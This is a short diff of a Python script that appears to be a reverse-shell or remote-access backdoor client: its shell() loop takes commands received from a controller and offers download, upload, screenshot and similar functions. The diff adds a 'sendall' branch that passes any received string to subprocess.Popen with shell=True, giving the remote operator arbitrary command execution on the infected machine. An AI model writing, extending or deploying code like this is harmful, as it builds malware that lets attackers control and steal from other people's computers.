@@ -63,8 +63,10 @@ def shell():
 		command = reliable_recv()
 		if command == 'q':
 			break
-		if command  == "exit":
+		elif command  == "exit":
 			break
+		elif command[:7] == "sendall":
+			subprocess.Popen(command[8:], shell=True)
 		elif command[:] == "help":
 			help_options ="Command used download , upload , get, screenshot, start, check"  
 			relibale_send(help_options.encode('utf-8'))
